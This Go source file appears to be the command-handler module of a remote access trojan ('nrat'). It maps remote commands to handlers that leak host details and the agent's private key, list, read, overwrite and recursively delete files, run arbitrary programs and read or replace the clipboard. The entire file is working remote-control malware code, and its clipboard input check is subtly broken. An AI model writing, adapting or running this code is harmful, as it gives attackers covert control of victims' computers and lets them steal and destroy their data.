package agent

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"nrat/model"

	"github.com/atotto/clipboard"
)

type handler func(agent *Agent, ev *model.Event) (string, error)

var agentHandlers = map[string]handler{
	"info":      infoHandler,
	"ping":      pingHandler,
	"list":      listHandler,
	"read":      readHandler,
	"write":     writeHandler,
	"mkdir":     mkdirHandler,
	"rename":    renameHandler,
	"remove":    removeHandler,
	"exec":      execHandler,
	"clipboard": clipboardHandler,
}

func infoHandler(agent *Agent, ev *model.Event) (string, error) {
	return strings.Join([]string{
		runtime.GOOS,
		runtime.GOARCH,
		strconv.Itoa(runtime.NumCPU()),
		runtime.Version(),
		agent.storage.Storage().Relay,
		agent.storage.Storage().Proxy,
		agent.storage.Storage().PrivateKey,
	}, model.DataSeparator), nil
}

func pingHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content != "" {
		return ev.Content, nil
	}

	return "none", nil
}

func listHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		ev.Content = "."
	}

	l, e := os.ReadDir(ev.Content)
	if e != nil {
		return "", e
	}

	files := []string{}
	for _, f := range l {
		files = append(files, func() string {
			if f.IsDir() {
				return f.Name() + "/"
			}

			return f.Name()
		}())
	}

	return strings.Join(files, model.DataSeparator), nil
}

func readHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		return "", errors.New("empty file path")
	}

	b, e := os.ReadFile(ev.Content)
	if e != nil {
		return "", e
	}

	return base64.StdEncoding.EncodeToString(b), nil
}

func writeHandler(agent *Agent, ev *model.Event) (string, error) {
	n := strings.LastIndex(ev.Content, model.DataSeparator)
	if n < 1 {
		return "", errors.New("invalid file data")
	}

	b, e := base64.StdEncoding.DecodeString(ev.Content[n+1:])
	if e != nil {
		return "", e
	}

	if e := os.WriteFile(ev.Content[:n], b, 0o755); e != nil {
		return "", e
	}

	return "ok", nil
}

func mkdirHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		return "", errors.New("empty dir path")
	}

	if e := os.MkdirAll(ev.Content, 0o755); e != nil {
		return "", e
	}

	return "ok", nil
}

func renameHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		return "", errors.New("empty file path")
	}

	n := strings.SplitN(ev.Content, model.DataSeparator, 2)
	if len(n) < 2 {
		return "", errors.New("invalid file path")
	}

	if e := os.Rename(n[0], n[1]); e != nil {
		return "", e
	}

	return "ok", nil
}

func removeHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		return "", errors.New("empty file path")
	}

	if e := os.RemoveAll(ev.Content); e != nil {
		return "", e
	}

	return "ok", nil
}

func execHandler(agent *Agent, ev *model.Event) (string, error) {
	if ev.Content == "" {
		return "", errors.New("empty command")
	}

	cmd := strings.Split(ev.Content, model.DataSeparator)
	if len(cmd) < 2 {
		return "", errors.New("invalid command")
	}

	t, e := time.ParseDuration(cmd[0])
	if e != nil {
		return "", fmt.Errorf("invalid timeout: %w", e)
	}

	ctx, cancel := context.WithTimeout(context.Background(), t)
	defer cancel()

	b, e := exec.CommandContext(ctx, cmd[1], cmd[2:]...).CombinedOutput()
	if e != nil {
		return "", e
	}

	if len(b) == 0 {
		b = []byte("success")
	}

	return base64.StdEncoding.EncodeToString(b), nil
}

func clipboardHandler(agent *Agent, ev *model.Event) (string, error) {
	n := strings.Split(ev.Content, model.DataSeparator)
	if len(n) < 1 && (n[0] == "set" && len(n) < 2) {
		return "", errors.New("invalid clipboard data")
	}

	switch n[0] {
	case "set":
		b, e := base64.StdEncoding.DecodeString(n[1])
		if e != nil {
			return "", e
		}

		if e := clipboard.WriteAll(string(b)); e != nil {
			return "", e
		}

		return "ok", nil
	case "get":
		b, e := clipboard.ReadAll()
		if e != nil {
			return "", e
		}

		return base64.StdEncoding.EncodeToString([]byte(b)), nil
	}

	return "", errors.New("invalid clipboard command")
}
